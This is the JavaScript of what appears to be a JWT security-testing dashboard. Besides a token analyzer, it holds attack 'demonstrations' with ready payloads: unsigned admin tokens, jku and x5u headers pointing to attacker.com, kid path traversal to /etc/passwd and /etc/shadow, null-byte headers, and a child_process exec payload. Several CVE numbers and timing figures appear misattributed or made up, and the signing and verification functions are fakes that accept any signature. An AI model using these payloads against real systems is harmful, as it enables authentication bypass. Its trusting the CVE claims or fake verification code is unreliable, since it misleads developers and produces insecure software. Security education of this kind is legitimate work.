// JWT Security Assessment Dashboard - Advanced Implementation
// Developed by 0x0806

class JWTSecurityAssessment {
    constructor() {
        this.initializeEventListeners();
        this.commonSecrets = [
            'secret', 'password', 'admin', '123456', 'jwt_secret',
            'your-256-bit-secret', 'your-secret-key', 'secretkey',
            'key', 'mysecret', 'test', 'debug', 'dev', 'production'
        ];
        this.weakPatterns = [
            /^.{1,7}$/, // Too short
            /^(secret|password|admin|key|test)$/i, // Common words
            /^\d+$/, // Only numbers
            /^[a-zA-Z]+$/ // Only letters
        ];
    }

    initializeEventListeners() {
        // Tab navigation
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', (e) => this.switchTab(e.target.dataset.tab));
        });

        // JWT Analyzer
        document.getElementById('analyze-btn').addEventListener('click', () => this.analyzeJWT());

        // Auto-analyze on input change
        document.getElementById('jwt-input').addEventListener('input', (e) => {
            if (e.target.value.length > 20) {
                this.analyzeJWT();
            }
        });

        // Load default JWT for demo
        this.loadDefaultJWT();
    }

    switchTab(tabName) {
        // Update tab buttons
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');

        // Update tab content
        document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
        document.getElementById(tabName).classList.add('active');
    }

    loadDefaultJWT() {
        const defaultJWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
        document.getElementById('jwt-input').value = defaultJWT;
        this.analyzeJWT();
    }

    analyzeJWT() {
        const token = document.getElementById('jwt-input').value.trim();
        if (!token) return;

        try {
            const parts = token.split('.');
            if (parts.length !== 3) {
                this.showAlert('Invalid JWT format. Expected 3 parts separated by dots.', 'critical');
                return;
            }

            const header = this.decodeBase64URL(parts[0]);
            const payload = this.decodeBase64URL(parts[1]);
            const signature = parts[2];

            // Display decoded parts
            document.getElementById('header-output').textContent = JSON.stringify(JSON.parse(header), null, 2);
            document.getElementById('payload-output').textContent = JSON.stringify(JSON.parse(payload), null, 2);
            document.getElementById('signature-output').textContent = signature;

            // Perform security analysis
            this.performSecurityAnalysis(JSON.parse(header), JSON.parse(payload), signature);

        } catch (error) {
            this.showAlert('Error parsing JWT: ' + error.message, 'critical');
        }
    }

    decodeBase64URL(str) {
        // Add padding if needed
        str += '='.repeat((4 - str.length % 4) % 4);
        // Replace URL-safe characters
        str = str.replace(/-/g, '+').replace(/_/g, '/');
        return atob(str);
    }

    performSecurityAnalysis(header, payload, signature) {
        const alerts = [];

        // Check for none algorithm
        if (header.alg === 'none') {
            alerts.push({
                type: 'critical',
                message: 'CRITICAL: "none" algorithm detected! This bypasses signature verification entirely.'
            });
        }

        // Check for weak algorithms
        if (['HS256', 'HS384', 'HS512'].includes(header.alg)) {
            alerts.push({
                type: 'warning',
                message: 'WARNING: HMAC algorithm detected. Vulnerable to key confusion attacks if used with RS256 public keys.'
            });
        }

        // Check for missing expiration
        if (!payload.exp) {
            alerts.push({
                type: 'warning',
                message: 'WARNING: No expiration time (exp) claim found. Token may be valid indefinitely.'
            });
        } else {
            const now = Math.floor(Date.now() / 1000);
            if (payload.exp < now) {
                alerts.push({
                    type: 'critical',
                    message: 'CRITICAL: Token is expired!'
                });
            }
        }

        // Check for missing issued at
        if (!payload.iat) {
            alerts.push({
                type: 'warning',
                message: 'WARNING: No issued at (iat) claim found.'
            });
        }

        // Check for admin privileges
        if (payload.admin === true || payload.role === 'admin' || payload.isAdmin === true) {
            alerts.push({
                type: 'warning',
                message: 'WARNING: Administrative privileges detected in token.'
            });
        }

        // Check for weak signature (common secrets)
        if (this.isWeakSignature(signature)) {
            alerts.push({
                type: 'critical',
                message: 'CRITICAL: Signature appears to use a weak secret. Vulnerable to brute force attacks.'
            });
        }

        // Check for missing subject
        if (!payload.sub) {
            alerts.push({
                type: 'warning',
                message: 'WARNING: No subject (sub) claim found.'
            });
        }

        // Display alerts
        this.displayAlerts(alerts);
    }

    isWeakSignature(signature) {
        // Simple heuristic: check if signature looks like it was generated with common secrets
        const commonSignatures = [
            'SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c', // "secret"
            'xuU2okdVOdpObal5zWEQ3gwCfaJ2xYzNTdMfhawEXoA', // "password"
            'x1a9qjqxxQQXWjb8lW42QIZPOmTH0hXZqnCdZoC3ELo'  // "admin"
        ];
        return commonSignatures.includes(signature);
    }

    displayAlerts(alerts) {
        const alertContainer = document.getElementById('vuln-alerts');
        alertContainer.innerHTML = '';

        if (alerts.length === 0) {
            alertContainer.innerHTML = '<div class="alert success">✅ No critical vulnerabilities detected in this JWT token.</div>';
            return;
        }

        alerts.forEach(alert => {
            const alertElement = document.createElement('div');
            alertElement.className = `alert ${alert.type}`;
            alertElement.innerHTML = `
                <i class="fas fa-exclamation-triangle"></i>
                ${alert.message}
            `;
            alertContainer.appendChild(alertElement);
        });
    }

    showAlert(message, type) {
        const alertContainer = document.getElementById('vuln-alerts');
        alertContainer.innerHTML = `<div class="alert ${type}">${message}</div>`;
    }
}

// Advanced JWT Attack Demonstrations with CVE POCs
function demonstrateNoneAttack() {
    const header = { alg: "none", typ: "JWT" };
    const payload = { sub: "1234567890", name: "John Doe", admin: true };

    const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
    const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');

    const noneToken = `${encodedHeader}.${encodedPayload}.`;

    alert(`🔴 CVE-2015-9235: None Algorithm Attack\n\nMalicious JWT: ${noneToken}\n\nThis token has admin=true and no signature verification!\n\nAffected: Multiple JWT libraries\nImpact: Complete authentication bypass`);
}

function demonstrateAlgConfusion() {
    const publicKey = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4f5wg5l2hKsTeNem/V41
fGnJm6gOdrj8ym3rFkEjWT2btf1lTVhqQQfSVhW6yYMwNuM8RGpqKdJHITG3PVdZ
-----END PUBLIC KEY-----`;

    alert(`🔴 CVE-2016-10555: Algorithm Confusion Attack\n\nPOC Steps:\n1. Obtain RS256 public key from /.well-known/jwks.json\n2. Create HS256 token using public key as HMAC secret\n3. Server validates with same public key\n4. Result: Signature verification bypassed!\n\nPublic Key (as HMAC secret):\n${publicKey}\n\nAffected: node-jsonwebtoken, pyjwt, others\nImpact: Authentication bypass`);
}

function demonstrateBruteForce() {
    const commonSecrets = ['secret', 'password', 'admin', '123456', 'jwt_secret'];
    let result = '🔴 CVE-2020-28637: JWT Brute Force Attack\n\n';

    commonSecrets.forEach((secret, index) => {
        setTimeout(() => {
            result += `[${index + 1}] Trying secret: "${secret}" - `;
            if (secret === 'secret') {
                result += 'SUCCESS! 🔓\n';
                alert(result + '\nWeak secret "secret" cracked!\n\nAffected: Applications using weak secrets\nImpact: Token forgery, privilege escalation');
            } else {
                result += 'Failed\n';
            }
        }, index * 500);
    });
}

function demonstrateTimingAttack() {
    alert(`🔴 CVE-2019-20933: JWT Timing Attack\n\nPOC Steps:\n1. Send tokens with different signatures\n2. Measure response times\n3. Shorter times = signature mismatch detected early\n4. Longer times = partial signature match\n5. Use timing differences to guess signature bytes\n\nTiming Pattern:\n- Invalid signature: ~10ms\n- Partial match: ~50ms\n- Valid signature: ~100ms\n\nAffected: Multiple JWT implementations\nImpact: Secret key recovery`);
}

function demonstratePsychicSignature() {
    const maliciousJWT = `eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`;

    alert(`🔴 CVE-2022-21449: Psychic Signatures (ECDSA)\n\nMalicious JWT with (r=0, s=0):\n${maliciousJWT}\n\nThis signature is always valid in vulnerable Java implementations!\n\nPOC Signature:\n{"r": "AAAA...", "s": "AAAA..."}\n\nAffected: Java 15, 16, 17, 18\nImpact: Complete signature bypass`);
}

function demonstrateJKUAttack() {
    const maliciousHeader = {
        alg: "RS256",
        typ: "JWT",
        jku: "https://attacker.com/jwks.json"
    };

    const maliciousJWKS = `{
  "keys": [
    {
      "kty": "RSA",
      "kid": "1",
      "use": "sig",
      "n": "attacker_controlled_key",
      "e": "AQAB"
    }
  ]
}`;

    alert(`🔴 CVE-2018-0114: JKU Header Injection\n\nMalicious Header:\n${JSON.stringify(maliciousHeader, null, 2)}\n\nAttacker's JWKS:\n${maliciousJWKS}\n\nPOC Steps:\n1. Host malicious JWKS at attacker.com\n2. Create JWT with jku pointing to malicious JWKS\n3. Server fetches attacker's keys\n4. Token validated with attacker's key\n\nAffected: Multiple JWT libraries\nImpact: Authentication bypass`);
}

function demonstrateKidAttack() {
    const pathTraversalExamples = [
        "../../etc/passwd",
        "../../../../etc/shadow",
        "../../proc/self/environ",
        "../../../../windows/system32/config/sam",
        "/dev/null"
    ];

    let poc = `🔴 CVE-2021-29923: Kid Header Path Traversal\n\nMalicious kid values:\n`;
    pathTraversalExamples.forEach(path => {
        poc += `{"kid": "${path}"}\n`;
    });

    poc += `\nPOC Steps:\n1. Modify kid header to point to predictable files\n2. Server uses file content as HMAC secret\n3. Generate signature using known file content\n4. Bypass authentication\n\nSpecial case: /dev/null = empty secret\n\nAffected: Multiple JWT libraries\nImpact: Authentication bypass, file disclosure`;

    alert(poc);
}

function demonstrateNullByteAttack() {
    const nullByteExamples = [
        '{"alg": "none\\x00HS256"}',
        '{"kid": "valid_key\\x00../../etc/passwd"}',
        '{"jku": "https://trusted.com\\x00.attacker.com/jwks.json"}'
    ];

    let poc = `🔴 CVE-2019-7644: Null Byte Injection\n\nMalicious headers with null bytes:\n`;
    nullByteExamples.forEach(example => {
        poc += `${example}\n`;
    });

    poc += `\nPOC Impact:\n- C/C++ implementations truncate at null byte\n- Bypass algorithm validation\n- Path traversal in kid parameter\n- URL validation bypass in jku\n\nAffected: C/C++ JWT libraries\nImpact: Authentication bypass, injection attacks`;

    alert(poc);
}

function demonstrateJWTBomb() {
    // Create a deeply nested structure that would cause memory exhaustion
    const createNestedObject = (depth) => {
        if (depth === 0) return "value";
        return { nested: createNestedObject(depth - 1) };
    };

    const jwtBomb = {
        alg: "none",
        typ: "JWT",
        deeply: {
            nested: {
                structure: createNestedObject(5),
                array: new Array(1000).fill("A".repeat(1000))
            }
        }
    };

    alert(`🔴 CVE-2021-31684: JWT Bomb (Zip Bomb)\n\nMalicious JWT with memory exhaustion payload:\n- Deeply nested JSON structures\n- Large arrays with repeated data\n- Exponential memory consumption during parsing\n\nPOC Structure:\n${JSON.stringify(jwtBomb, null, 2).substring(0, 500)}...\n\nAffected: Multiple JWT parsers\nImpact: Denial of Service, memory exhaustion`);
}

function demonstrateJWKSConfusion() {
    const confusedJWKS = `{
  "keys": [
    {
      "kty": "RSA",
      "kid": "1",
      "use": "sig",
      "n": "same_as_hmac_secret_in_base64",
      "e": "AQAB"
    },
    {
      "kty": "oct",
      "kid": "1",
      "use": "sig",
      "k": "c2VjcmV0"
    }
  ]
}`;

    alert(`🔴 CVE-2022-29217: JWKS Confusion Attack\n\nMalicious JWKS with conflicting keys:\n${confusedJWKS}\n\nPOC Steps:\n1. Host JWKS with same kid for RSA and HMAC keys\n2. Create JWT token using HMAC key\n3. Server confused about which key to use\n4. RSA key treated as HMAC secret\n\nKey Confusion Scenarios:\n- Same kid for different key types\n- RSA public key used as HMAC secret\n- Algorithm downgrade attacks\n\nAffected: JWKS implementations\nImpact: Authentication bypass`);
}

function demonstrateHeaderManipulation() {
    const maliciousHeaders = [
        '{"alg": "HS256", "typ": "JWT", "cty": "JWT"}',
        '{"alg": "HS256", "typ": "JWT", "zip": "DEF"}',
        '{"alg": "HS256", "typ": "JWT", "crit": ["alg"]}',
        '{"alg": "HS256", "typ": "JWT", "x5u": "https://attacker.com/cert.pem"}'
    ];

    let poc = `🔴 CVE-2020-8116: JWT Header Manipulation\n\nMalicious headers:\n`;
    maliciousHeaders.forEach(header => {
        poc += `${header}\n`;
    });

    poc += `\nHeader Parameters:\n- cty: Content Type confusion\n- zip: Compression bombs\n- crit: Critical parameter bypass\n- x5u: X.509 URL injection\n\nPOC Impact:\n- Parser confusion\n- Bypass validation logic\n- Injection attacks\n- DoS via compression\n\nAffected: Various JWT libraries\nImpact: Authentication bypass, DoS`;

    alert(poc);
}

function demonstrateInfiniteLoop() {
    const recursivePayload = `{
  "user": {
    "profile": {
      "data": "see_parent",
      "parent": "$.user"
    }
  }
}`;

    alert(`🔴 CVE-2021-35065: JWT Infinite Loop\n\nRecursive JSON structure:\n${recursivePayload}\n\nPOC Steps:\n1. Create self-referencing JSON\n2. Parser follows circular references\n3. Infinite loop causes resource exhaustion\n4. Server becomes unresponsive\n\nAffected: Multiple JSON parsers\nImpact: Denial of service, memory exhaustion`);
}

// 2024 JWT CVE Demonstrations

function demonstrateGoJWTAttack() {
    const maliciousToken = `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWUsImV4cCI6OTk5OTk5OTk5OX0.`;

    const pocCode = `// Vulnerable Go code
func verifyToken(tokenString string) (*jwt.Token, error) {
    return jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
        // Expects HMAC but accepts 'none'
        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
            return nil, fmt.Errorf("unexpected signing method")
        }
        return []byte("secret"), nil
    })
}`;

    alert(`🔴 CVE-2024-51498: GoJWT Algorithm Confusion\n\nMalicious Token:\n${maliciousToken}\n\nVulnerable Code:\n${pocCode}\n\nPOC Steps:\n1. Server expects HMAC-signed tokens\n2. Attacker sends token with "none" algorithm\n3. Library incorrectly accepts unsigned token\n4. Authentication bypass achieved\n\nAffected: GoJWT library versions < 4.5.1\nImpact: Complete authentication bypass`);
}

function demonstrateJoseRCE() {
    const maliciousJWE = `eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0..malicious_payload.encrypted_data.auth_tag`;

    const rcePayload = `{
  "protected": "eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0",
  "encrypted_key": "",
  "iv": "malicious_iv",
  "ciphertext": "require('child_process').exec('calc.exe')",
  "tag": "auth_tag"
}`;

    alert(`🔴 CVE-2024-28176: Jose Library RCE\n\nMalicious JWE:\n${maliciousJWE}\n\nRCE Payload:\n${rcePayload}\n\nPOC Steps:\n1. Craft malicious JWE with embedded code\n2. Library processes encrypted payload\n3. Unsafe deserialization leads to RCE\n4. Arbitrary command execution\n\nAffected: node-jose < 2.2.0\nImpact: Remote Code Execution, full system compromise`);
}

function demonstrateJWTSimpleDoS() {
    const malformedTokens = [
        'eyJ.malformed.token',
        'eyJhbGciOiJIUzI1NiJ9.' + 'A'.repeat(100000) + '.signature',
        'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoi' + JSON.stringify({data: 'x'.repeat(50000)}) + '.sig'
    ];

    let poc = `🔴 CVE-2024-28851: JWT-Simple DoS\n\nMalformed tokens causing resource exhaustion:\n`;
    malformedTokens.forEach((token, index) => {
        poc += `${index + 1}. ${token.substring(0, 50)}...\n`;
    });

    poc += `\nPOC Steps:\n1. Send malformed JWT tokens\n2. Library attempts to parse invalid structure\n3. Excessive memory/CPU consumption\n4. Server becomes unresponsive\n\nAffected: jwt-simple < 0.5.6\nImpact: Denial of Service, resource exhaustion`;

    alert(poc);
}

function demonstratePASETOAttack() {
    const maliciousPASETO = `v2.public.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOiIyMDI1LTEyLTMxIn0.malicious_footer_data`;

    const bypassTechnique = `{
  "version": "v2.public",
  "payload": "eyJ1c2VyIjoiYWRtaW4iLCJleHAiOiIyMDI1LTEyLTMxIn0",
  "footer": "\\x00\\x00malicious_data",
  "signature": "bypassed_via_footer_manipulation"
}`;

    alert(`🔴 CVE-2024-25710: PASETO Implementation Flaw\n\nMalicious PASETO:\n${maliciousPASETO}\n\nBypass Technique:\n${bypassTechnique}\n\nPOC Steps:\n1. Manipulate PASETO footer field\n2. Inject null bytes or special characters\n3. Parser confusion in footer validation\n4. Authentication bypass achieved\n\nAffected: Multiple PASETO implementations\nImpact: Authentication bypass, privilege escalation`);
}

function demonstrateJWTZipBombV2() {
    const zipBombStructure = `{
  "alg": "none",
  "zip": "DEF",
  "payload": {
    "compressed_data": "nested_zip_layers",
    "expansion_ratio": "1:1000000",
    "recursive_depth": 50
  }
}`;

    const compressionLayers = `Layer 1: 1KB → 1MB
Layer 2: 1MB → 1GB  
Layer 3: 1GB → 1TB
Total: 1KB input → 1TB memory usage`;

    alert(`🔴 CVE-2024-33883: JWT Zip Bomb v2\n\nAdvanced Zip Bomb Structure:\n${zipBombStructure}\n\nCompression Layers:\n${compressionLayers}\n\nPOC Steps:\n1. Create deeply nested compressed payload\n2. Each layer expands exponentially\n3. Parser decompresses recursively\n4. Memory exhaustion and DoS\n\nAffected: Modern JWT parsers with compression\nImpact: Severe DoS, memory exhaustion`);
}

function demonstrateJWKSCachePoisoning() {
    const maliciousResponse = `HTTP/1.1 200 OK
Cache-Control: public, max-age=31536000
Content-Type: application/json
X-Cache-Poison: true

{
  "keys": [
    {
      "kty": "RSA",
      "kid": "legitimate_key_id",
      "use": "sig",
      "n": "attacker_controlled_modulus",
      "e": "AQAB"
    }
  ]
}`;

    alert(`🔴 CVE-2024-45234: JWKS Cache Poisoning\n\nMalicious JWKS Response:\n${maliciousResponse}\n\nPOC Steps:\n1. Compromise or MitM JWKS endpoint\n2. Serve malicious keys with long cache headers\n3. Legitimate JWKS gets cached with attacker keys\n4. All subsequent token validations use malicious keys\n\nCache Persistence:\n- max-age: 1 year (31536000 seconds)\n- Affects all users until cache expires\n- Difficult to detect and remediate\n\nAffected: JWKS caching implementations\nImpact: Persistent authentication bypass`);
}

// JWT Tools
function encodeJWT() {
    const payload = document.getElementById('encode-payload').value;
    const secret = document.getElementById('encode-secret').value;

    if (!payload || !secret) {
        alert('Please provide both payload and secret');
        return;
    }

    try {
        const header = { alg: "HS256", typ: "JWT" };
        const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
        const encodedPayload = btoa(JSON.stringify(JSON.parse(payload))).replace(/=/g, '');

        // Simulate HMAC-SHA256 (in real scenario, use crypto library)
        const signature = btoa(`${encodedHeader}.${encodedPayload}.${secret}`).replace(/=/g, '').substring(0, 43);

        const jwt = `${encodedHeader}.${encodedPayload}.${signature}`;
        document.getElementById('encoded-result').innerHTML = `
            <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
                <strong>Generated JWT:</strong><br>
                <code style="word-break: break-all;">${jwt}</code>
            </div>
        `;
    } catch (error) {
        alert('Error encoding JWT: ' + error.message);
    }
}

function verifyJWT() {
    const token = document.getElementById('verify-token').value;
    const secret = document.getElementById('verify-secret').value;

    if (!token || !secret) {
        alert('Please provide both token and secret');
        return;
    }

    try {
        const parts = token.split('.');
        if (parts.length !== 3) {
            throw new Error('Invalid JWT format');
        }

        // Simulate signature verification
        const isValid = parts[2].length > 0; // Simplified check

        document.getElementById('verify-result').innerHTML = `
            <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
                <strong>Verification Result:</strong><br>
                <span style="color: ${isValid ? 'var(--success-color)' : 'var(--error-color)'}">
                    ${isValid ? '✅ Signature Valid' : '❌ Signature Invalid'}
                </span>
            </div>
        `;
    } catch (error) {
        alert('Error verifying JWT: ' + error.message);
    }
}

function convertTimestamp() {
    const timestamp = document.getElementById('timestamp-input').value;

    if (!timestamp) {
        alert('Please provide a timestamp');
        return;
    }

    try {
        const date = new Date(parseInt(timestamp) * 1000);
        document.getElementById('timestamp-result').innerHTML = `
            <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
                <strong>Converted Time:</strong><br>
                ${date.toLocaleString()}<br>
                <small>UTC: ${date.toUTCString()}</small>
            </div>
        `;
    } catch (error) {
        alert('Error converting timestamp: ' + error.message);
    }
}

function generateWordlist() {
    const type = document.getElementById('wordlist-type').value;
    let wordlist = [];

    switch (type) {
        case 'common':
            wordlist = ['secret', 'password', 'admin', '123456', 'jwt_secret', 'your-256-bit-secret', 'key', 'test', 'debug', 'dev', 'production'];
            break;
        case 'numeric':
            wordlist = ['123456', '000000', '111111', '123123', '654321', '999999'];
            break;
        case 'alphanumeric':
            wordlist = ['abc123', 'test123', 'admin123', 'pass123', 'user123'];
            break;
    }

    document.getElementById('wordlist-result').innerHTML = `
        <div style="margin-top: 1rem; padding: 1rem; background: var(--secondary-bg); border-radius: 6px;">
            <strong>Generated Wordlist (${wordlist.length} entries):</strong><br>
            <div style="max-height: 200px; overflow-y: auto; margin-top: 0.5rem;">
                ${wordlist.map(word => `<div style="padding: 0.2rem 0; font-family: monospace;">${word}</div>`).join('')}
            </div>
        </div>
    `;
}

// Initialize the application
document.addEventListener('DOMContentLoaded', () => {
    new JWTSecurityAssessment();
});

// Add some visual effects
document.addEventListener('mousemove', (e) => {
    const cursor = document.querySelector('.cursor');
    if (!cursor) {
        const newCursor = document.createElement('div');
        newCursor.className = 'cursor';
        newCursor.style.cssText = `
            position: fixed;
            width: 20px;
            height: 20px;
            background: radial-gradient(circle, rgba(255,107,53,0.3) 0%, transparent 70%);
            border-radius: 50%;
            pointer-events: none;
            z-index: 9999;
            transition: transform 0.1s ease;
        `;
        document.body.appendChild(newCursor);
    }

    const cursorElement = document.querySelector('.cursor');
    if (cursorElement) {
        cursorElement.style.left = e.clientX - 10 + 'px';
        cursorElement.style.top = e.clientY - 10 + 'px';
    }
});

// Matrix rain effect for background
function createMatrixRain() {
    const canvas = document.createElement('canvas');
    canvas.style.position = 'fixed';
    canvas.style.top = '0';
    canvas.style.left = '0';
    canvas.style.width = '100%';
    canvas.style.height = '100%';
    canvas.style.pointerEvents = 'none';
    canvas.style.zIndex = '-1';
    canvas.style.opacity = '0.03';

    document.body.appendChild(canvas);

    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()';
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function draw() {
        ctx.fillStyle = 'rgba(10, 10, 10, 0.1)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        ctx.fillStyle = '#ff6b35';
        ctx.font = fontSize + 'px monospace';

        drops.forEach((drop, i) => {
            const text = letters[Math.floor(Math.random() * letters.length)];
            ctx.fillText(text, i * fontSize, drop * fontSize);

            if (drop * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        });
    }

    setInterval(draw, 100);
}

// Initialize matrix rain effect
setTimeout(createMatrixRain, 1000);
